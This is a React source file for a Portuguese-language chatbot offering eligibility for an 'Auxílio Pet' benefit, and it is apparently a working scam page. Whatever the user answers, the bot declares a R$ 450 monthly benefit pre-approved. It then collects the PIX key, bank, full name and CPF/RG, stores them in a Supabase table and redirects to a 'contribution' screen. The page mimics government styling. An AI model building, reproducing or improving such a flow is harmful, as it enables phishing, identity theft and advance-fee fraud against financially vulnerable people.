import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { Sparkles, ArrowLeft, Send, ShieldCheck } from 'lucide-react';
import { supabase } from '../lib/supabase';
import { useAnalytics } from '../hooks/useAnalytics';

interface Message {
  type: 'bot' | 'user';
  text: string;
  id: number;
}

function Questionario() {
  const navigate = useNavigate();
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStep, setCurrentStep] = useState("Q1");
  const [userData, setUserData] = useState<any>({});
  const [showButtons, setShowButtons] = useState(false);
  const [showInput, setShowInput] = useState(false);
  const [inputText, setInputText] = useState("");
  const [isTyping, setIsTyping] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const hasInitialized = useRef(false);
  const messageIdRef = useRef(0);
  const { trackButtonClick } = useAnalytics('questionario');

  // Força a mensagem a ficar no CENTRO da tela
  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth', block: 'center' });
  };

  useEffect(() => {
    const timeoutId = setTimeout(scrollToBottom, 100);
    return () => clearTimeout(timeoutId);
  }, [messages, showButtons, isTyping, showInput]);

  useEffect(() => {
    if (!hasInitialized.current) {
      hasInitialized.current = true;
      addBotMessage("Olá! Sou a IA que irá lhe atender para verificar a elegibilidade para o Auxílio Pet.\n\nVamos começar a análise do seu perfil.");
      setTimeout(() => processStep("Q1"), 1000);
    }
  }, []);

  const addBotMessage = (text: string) => {
    setMessages(prev => [...prev, { type: 'bot', text, id: messageIdRef.current++ }]);
  };

  const addUserMessage = (text: string) => {
    setMessages(prev => [...prev, { type: 'user', text, id: messageIdRef.current++ }]);
  };

  const processStep = (step: string) => {
    setShowButtons(false);
    setShowInput(false);
    setIsTyping(true);

    setTimeout(() => {
      setIsTyping(false);
      const question = getQuestion(step);
      
      if (question.text) {
        addBotMessage(question.text);
      }

      if (question.type === 'end_flow') {
        // Redireciona para a tela de APROVAÇÃO (fluxo novo)
        setTimeout(() => navigate('/aprovacao'), 1500); 
        return;
      }

      setTimeout(() => {
        if (question.type === 'input') {
          setShowInput(true);
        } else if (question.type === 'options' || question.type === 'auto') {
          setShowButtons(true);
        }
      }, 500);

    }, 1000);
  };

  const handleResponse = (value: string, label: string) => {
    trackButtonClick(`step_${currentStep}`, { value });
    addUserMessage(label);
    
    const nextData = { ...userData, [currentStep]: value };
    setUserData(nextData);
    
    const nextStep = getNextStep(currentStep);
    
    // CORREÇÃO CRÍTICA AQUI:
    // Antes estava "END", mas o fluxo redireciona no "FINAL_MSG".
    // Agora salvamos assim que o próximo passo for "FINAL_MSG".
    if (nextStep === 'FINAL_MSG' || nextStep === 'END') {
       saveAnswers(nextData);
    }

    setCurrentStep(nextStep);
    processStep(nextStep);
  };

  const handleInputSubmit = (e?: React.FormEvent) => {
    e?.preventDefault();
    if (!inputText.trim()) return;
    handleResponse(inputText, inputText);
    setInputText("");
  };

  // --- FUNÇÃO DE SALVAR COMPLETA ---
  const saveAnswers = async (finalData: any) => {
    try {
      const registrationId = localStorage.getItem('registration_id');
      console.log("Tentando salvar dados para ID:", registrationId); // Log para debug

      if (registrationId) {
        
        // 1. DADOS DO PET (Tabela pet_questionnaire)
        const questionnairePayload = {
          registration_id: registrationId,
          quantidade_pets: parseInt(finalData["Q1"]) || 1,
          alimentacao: finalData["Q3"],
          dificuldade_financeira: finalData["Q4"],
          castrado: finalData["Q5"],
          vacinas: finalData["Q6"],
          frequencia_alimentacao: "Não informado",
          origem: "Não informado", 
          controle_parasitas: "Não informado",
          emergencia_financeira: finalData["Q4"] 
        };

        // Usa 'as any' para evitar bloqueio do TypeScript
        const { error: questError } = await (supabase.from('pet_questionnaire') as any)
          .insert([questionnairePayload]);

        if (questError) {
            console.error("Erro ao salvar questionário:", questError);
        } else {
            console.log("Questionário salvo com sucesso!");
        }

        // 2. DADOS BANCÁRIOS (Tabela registrations)
        const bankingPayload = {
          chave_pix: finalData["Q8"],
          instituicao_bancaria: finalData["Q9"],
          reside_brasil: finalData["Q10"] === "Sim",
          nome_titular: finalData["Q11"],
          documento_titular: finalData["Q12"]
        };

        const { error: regError } = await (supabase.from('registrations') as any)
          .update(bankingPayload)
          .eq('id', registrationId);

        if (regError) {
            console.error("Erro ao salvar dados bancários:", regError);
        } else {
            console.log("Dados bancários salvos com sucesso!");
        }
      }
    } catch (err) { console.error("Erro geral no saveAnswers:", err); }
  };

  const getQuestion = (step: string) => {
    switch (step) {
      case "Q1": return { text: "Quantos animais de estimação vivem com você atualmente?", type: 'options' };
      case "Q2": return { text: "Sabemos que os custos pesam no fim do mês. Qual é a sua renda familiar aproximada?", type: 'options' };
      case "Q3": return { text: "Atualmente, como é a alimentação principal do seu pet?", type: 'options' };
      case "Q4": return { text: "Os custos com seu pet pesam no final do mês a ponto de, em alguns momentos, não ser possível garantir necessidades básicas (alimentação, vacinação ou atendimento veterinário)?", type: 'options' };
      case "Q5": return { text: "Seus pets já foram castrados?", type: 'options' };
      case "Q6": return { text: "A vacina antirrábica é essencial para a saúde e o controle de doenças. Seus animais estão vacinados contra a raiva?", type: 'options' };
      case "Q7": return { text: "Você possui alguma clínica veterinária próxima à sua residência para utilizar os serviços do Auxílio Pet?", type: 'options' };
      
      case "APPROVAL": return { 
        text: "Informamos que a análise preliminar dos dados cadastrais foi concluída.\n O benefício mensal de até R$ 450,00 foi pré-aprovado para custeio de alimentação e saúde veterinária.\n\n Aguardando dados bancários para repasse.\n\nPara prosseguir com a liberação dos recursos, solicitamos a confirmação dos dados de recebimento abaixo.", 
        type: 'auto' 
      };
      
      case "Q8": return { text: " DADOS PARA REPASSE DO BENEFÍCIO\n\nInforme a chave PIX da conta titular que receberá o auxílio:", type: 'input' };
      case "Q9": return { text: "Qual a instituição bancária da conta informada?", type: 'input' };
      case "Q10": return { text: "O titular da conta reside e é domiciliado no Brasil?", type: 'options' };
      case "Q11": return { text: "Nome completo do titular da conta:", type: 'input' };
      case "Q12": return { text: "Confirme o número do CPF ou RG do titular:", type: 'input' };
      
      case "FINAL_MSG": return { 
        text: "Você será redirecionado para a tela de contribuição...",
        type: 'end_flow'
      };
      
      default: return { text: "", type: 'none' };
    }
  };

  const getNextStep = (step: string) => {
    const sequence = ["Q1", "Q2", "Q3", "Q4", "Q5", "Q6", "Q7", "APPROVAL", "Q8", "Q9", "Q10", "Q11", "Q12", "FINAL_MSG", "END"];
    const idx = sequence.indexOf(step);
    return sequence[idx + 1] || "END";
  };

  const getButtons = () => {
    switch (currentStep) {
      case "Q1":
        return (
          <div className="grid grid-cols-1 gap-3">
            <button onClick={() => handleResponse("1", "1")} className="btn-option">1</button>
            <button onClick={() => handleResponse("2", "2")} className="btn-option">2</button>
            <button onClick={() => handleResponse("3+", "3 ou mais")} className="btn-option">3 ou mais</button>
          </div>
        );
      case "Q2":
        return (
          <div className="grid grid-cols-1 gap-3">
            <button onClick={() => handleResponse("ate_1_sm", "Até 1 salário mínimo")} className="btn-option">Até 1 salário mínimo</button>
            <button onClick={() => handleResponse("1_2_sm", "De 1 a 2 salários mínimos")} className="btn-option">De 1 a 2 salários mínimos</button>
            <button onClick={() => handleResponse("acima_2_sm", "Acima de 2 salários mínimos")} className="btn-option">Acima de 2 salários mínimos</button>
          </div>
        );
      case "Q3":
        return (
          <div className="grid grid-cols-1 gap-3">
            <button onClick={() => handleResponse("racao_adequada", "Ração adequada")} className="btn-option">Ração adequada</button>
            <button onClick={() => handleResponse("racao_possivel", "Ração quando possível")} className="btn-option">Ração quando possível</button>
            <button onClick={() => handleResponse("restos", "Restos de comida")} className="btn-option">Restos de comida</button>
            <button onClick={() => handleResponse("alterna", "Alterna entre ração e restos")} className="btn-option">Alterna entre ração e restos</button>
          </div>
        );
      case "Q4":
      case "Q5":
      case "Q6":
      case "Q7":
      case "Q10":
        return (
          <div className="grid grid-cols-1 gap-3">
            <button onClick={() => handleResponse("sim", "Sim")} className="btn-option">Sim</button>
            <button onClick={() => handleResponse("nao", "Não")} className="btn-option">Não</button>
            {currentStep === "Q4" && <button onClick={() => handleResponse("as_vezes", "Às vezes")} className="btn-option">Às vezes</button>}
            {currentStep === "Q5" && <button onClick={() => handleResponse("alguns", "Alguns sim, outros não")} className="btn-option">Alguns sim, outros não</button>}
            {currentStep === "Q6" && <button onClick={() => handleResponse("nao_sei", "Não sei informar")} className="btn-option">Não sei informar</button>}
          </div>
        );
      case "APPROVAL":
        return (
          <div className="grid grid-cols-1 gap-3">
            <button onClick={() => handleResponse("continuar", "Prosseguir para Validação")} className="btn-primary">
              Prosseguir para Validação
            </button>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="min-h-screen bg-[#F8F9FA] flex flex-col font-sans">
      
      <div className="bg-white border-b border-gray-200 py-4 px-6 shadow-sm sticky top-0 z-50">
        <div className="container mx-auto max-w-2xl flex items-center gap-4">
          <button onClick={() => navigate('/')} className="text-gray-500">
            <ArrowLeft size={24} />
          </button>
          <div className="flex items-center gap-2">
            <span className="font-bold text-[#1351B4] text-lg">Consulta de Elegibilidade</span>
          </div>
        </div>
      </div>

      <main className="flex-1 container mx-auto px-4 py-6 pb-96 max-w-2xl">
        <div className="space-y-6">
          {messages.map((message) => (
            <div key={message.id} className={`flex gap-3 ${message.type === 'user' ? 'justify-end' : 'justify-start'} animate-fadeInUp`}>
              {message.type === 'bot' && (
                <div className="w-10 h-10 rounded-full bg-[#1351B4] flex items-center justify-center flex-shrink-0 mt-1 shadow-sm">
                  {message.text.includes("GOVERNO") ? (
                    <ShieldCheck className="text-white" size={20} />
                  ) : (
                    <Sparkles className="text-white" size={18} />
                  )}
                </div>
              )}
              
              <div className={`px-5 py-4 rounded-2xl max-w-[85%] shadow-sm text-[15px] leading-relaxed whitespace-pre-line ${
                message.type === 'user' 
                  ? 'bg-[#1351B4] text-white rounded-tr-none font-medium' 
                  : 'bg-white text-gray-800 border border-gray-200 rounded-tl-none'
              }`}>
                {message.text}
              </div>
            </div>
          ))}

          {isTyping && (
            <div className="flex gap-3 animate-fadeInUp">
              <div className="w-10 h-10 rounded-full bg-[#1351B4] flex items-center justify-center flex-shrink-0 shadow-sm">
                <Sparkles className="text-white" size={18} />
              </div>
              <div className="bg-white border border-gray-200 px-4 py-3 rounded-2xl rounded-tl-none flex gap-1 items-center shadow-sm">
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"></div>
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce delay-100"></div>
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce delay-200"></div>
              </div>
            </div>
          )}
          <div ref={messagesEndRef} />
        </div>
      </main>

      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 p-4 shadow-[0_-4px_10px_-1px_rgba(0,0,0,0.1)] z-50">
        <div className="container mx-auto max-w-2xl">
          {showButtons && getButtons()}
          
          {showInput && (
            <form onSubmit={handleInputSubmit} className="flex gap-3">
              <input
                type="text"
                value={inputText}
                onChange={(e) => setInputText(e.target.value)}
                placeholder="Digite aqui..."
                className="flex-1 border border-gray-300 rounded-xl px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#1351B4] bg-white text-base"
                autoFocus
              />
              <button 
                type="submit" 
                className="bg-[#1351B4] text-white p-3 rounded-xl hover:bg-[#0c326f] transition-colors disabled:opacity-50 flex-shrink-0 shadow-sm"
                disabled={!inputText.trim()}
              >
                <Send size={22} />
              </button>
            </form>
          )}
        </div>
      </div>
    </div>
  );
}

export default Questionario;